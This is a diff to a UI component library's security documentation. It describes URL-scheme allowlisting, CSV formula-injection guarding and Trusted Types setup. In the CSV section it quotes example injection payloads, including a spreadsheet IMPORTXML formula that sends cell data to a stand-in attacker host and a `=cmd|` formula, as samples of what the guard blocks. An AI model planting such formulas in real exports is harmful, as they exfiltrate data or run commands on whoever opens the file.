@@ -54,17 +54,32 @@ Data-driven `url` fields (menu items, breadcrumbs, menubar items) can carry a
 `javascript:` scheme. Angular's `[href]` binding neutralizes those through
 `DomSanitizer`; React's `href={…}` does not, so the React layer routes every
 data-driven `href`/`src` through `sanitizeUrl` / `sanitizeResourceUrl` from
-`@oge-ui/behavior`, which rejects the executing schemes and returns
-`about:blank`. Both are exported — use them if you render your own links from
-the same data.
+`@oge-ui/behavior`. The check is an **allowlist**, the same shape as
+Angular's: relative URLs and the `http`, `https`, `mailto`, `tel`, `ftp` and
+`sms` schemes pass; every other scheme returns `about:blank`. `blob:` and
+non-markup `data:` URLs pass only for resources (`sanitizeResourceUrl`, or
+`allowObjectUrls: true`), and a custom protocol handler is opted into with
+`allowedSchemes: ['web+app']` — script schemes such as `javascript:` can never
+be allowed. Control characters and zero-width marks are stripped before the
+scheme is read. Both functions are exported — use them if you render your own
+links from the same data.
+
+BPMN overlay badges keep only allow-listed elements and attributes (no
+`role`), and a link that keeps `target` always gets `rel="noopener
+noreferrer"` in both render layers.
 
 ### Exports cannot execute on open
 
 `getCsv()` / `exportCsv()` (grid, tree list, pivot) and clipboard TSV prefix
-any cell that opens with `=`, `+`, `-`, `@`, tab or CR with an apostrophe, so
-a spreadsheet reads it as text rather than a formula — CSV formula injection
-(CWE-1236), the `=cmd|…!A1` and `=IMPORTXML("http://attacker/?"&A1)` class.
-Plain numbers are exempt, so numeric columns stay numeric. Pass
+with an apostrophe any cell whose **first non-whitespace character** is `=`,
+`+`, `-`, `@` or one of their full-width forms (`＝` `＋` `－` `＠`), and any
+cell that opens with a raw tab or CR, so a spreadsheet reads it as text rather
+than a formula — CSV formula injection (CWE-1236), the `=cmd|…!A1` and
+`=IMPORTXML("http://attacker/?"&A1)` class. Leading spaces do not hide a
+formula: `"   =cmd"` is guarded too. The tree list guards the first-column
+value before it adds its indentation, so the hierarchy padding cannot shift a
+formula past the check. Plain numbers are exempt, so numeric columns stay
+numeric. Pass
 `formulaGuard: false` where the file is consumed by a parser rather than
 opened in Excel or Sheets. The `.xlsx` exporters write typed cells, which
 Excel never evaluates, so they need no guard.
@@ -82,6 +97,25 @@ The packages ship no inline scripts and evaluate no strings — no `eval`, no
 `new Function`, no `document.write`. Inline styles are used for layout
 (virtual-scroll offsets, panel positioning), so a strict policy needs
 `style-src 'self' 'unsafe-inline'`. `script-src 'self'` is enough.
+
+### Trusted Types
+
+Under `require-trusted-types-for 'script'` the only Trusted Types sink in the
+suite is `DOMParser.parseFromString` in `@oge-ui/bpmn-engine` — it parses BPMN
+XML on import and overlay badge markup for the React layer. Both documents are
+inert (nothing in them runs or loads) and are only read, the overlay tree being
+re-sanitized against the allowlist above. When `trustedTypes` exists the engine
+creates, once and lazily, a policy named **`oge-ui#bpmn`** whose `createHTML`
+passes its input through unchanged; list it in your policy directive:
+
+```
+Content-Security-Policy: require-trusted-types-for 'script'; trusted-types oge-ui#bpmn
+```
+
+Angular apps also list Angular's own `angular` policy, which its sanitizing
+`[innerHTML]` binding uses (the BPMN overlay badges in the Angular layer); the
+suite never calls a `bypassSecurityTrust*` API, so `angular#unsafe-bypass` is
+not needed.
 
 ## Dependencies
 
